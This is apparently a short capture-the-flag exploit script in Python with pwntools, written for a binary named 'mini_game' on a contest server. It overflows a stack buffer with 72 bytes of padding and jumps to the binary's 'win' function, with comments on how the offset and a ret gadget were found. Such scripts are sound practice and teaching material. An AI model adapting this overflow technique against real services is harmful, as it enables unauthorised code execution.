from pwn import *
context.binary = elf = ELF('./mini_game', checksec=False)


REMOTE_HOST = 'offsec.m0lecon.it'
HOST_PORT = 13530
p = process(elf.path)
#p= remote(REMOTE_HOST,HOST_PORT)
OFFSET_RDX = 72 # find with python3 -c 'from pwn import *; print(cyclic_find(0x6161617461616173))'
                   # python3 -c 'from pwn import *; print(cyclic(200).decode())'
win = elf.symbols['win']
 
#ret_gadget = 0x40101a # finded with  ROPgadget --binary ./mini_game | grep "ret"
p.recvuntil(b"go?\n")
payload = flat(
    b'A' * OFFSET_RDX,
    #p64(ret_gadget),
    p64(win),
)
p.send(payload)
p.interactive()
